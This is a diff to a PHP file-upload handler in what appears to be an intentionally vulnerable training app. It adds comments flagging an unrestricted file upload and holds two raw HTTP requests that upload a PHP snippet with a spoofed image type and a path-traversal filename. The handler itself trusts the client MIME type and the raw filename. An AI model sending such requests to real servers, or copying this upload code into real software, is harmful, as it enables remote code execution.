@@ -32,6 +32,46 @@
 					$img_type = $_FILES['userfile']['type'];
 					$destination = 'uploads/' . $_FILES['userfile']['name'];
 					if (($img_type == 'image/png') || ($img_type == 'image/jpeg')  ) {
+						// TODO: AI issue #9, High, Unrestricted File Upload, https://github.com/rbm1718/bricks/issues/9
+						//
+						// POST /upload-3/index.php HTTP/1.1
+						// Host: localhost
+						// Accept-Encoding: identity
+						// Connection: close
+						// Content-Length: 307
+						// Content-Type: multipart/form-data; boundary=03e70c47a55545798ee077149eeef7bd
+						//
+						// --03e70c47a55545798ee077149eeef7bd
+						// Content-Disposition: form-data; name="upload"
+						//
+						// 935137890000
+						// --03e70c47a55545798ee077149eeef7bd
+						// Content-Disposition: form-data; name="userfile"; filename="../../../../../../../../../../tmp/"
+						// Content-Type: image/png
+						//
+						// <?php phpinfo(); ?>
+						// --03e70c47a55545798ee077149eeef7bd--
+						//
+						// TODO: AI issue #9, High, Unrestricted File Upload, https://github.com/rbm1718/bricks/issues/9
+						//
+						// POST /upload-3/index.php HTTP/1.1
+						// Host: localhost
+						// Accept-Encoding: identity
+						// Connection: close
+						// Content-Length: 308
+						// Content-Type: multipart/form-data; boundary=d28b37db30fa4a1ba9b4307ad0873cd2
+						//
+						// --d28b37db30fa4a1ba9b4307ad0873cd2
+						// Content-Disposition: form-data; name="upload"
+						//
+						// 935137890000
+						// --d28b37db30fa4a1ba9b4307ad0873cd2
+						// Content-Disposition: form-data; name="userfile"; filename="../../../../../../../../../../tmp/"
+						// Content-Type: image/jpeg
+						//
+						// <?php phpinfo(); ?>
+						// --d28b37db30fa4a1ba9b4307ad0873cd2--
+						//
 						if (move_uploaded_file($_FILES['userfile']['tmp_name'],$destination)) {
 							echo "<div class=\"alert-box success\">Upload succesful: <a href='$destination'>here</a><a href=\"\" class=\"close\">&times;</a></div>";
 						}
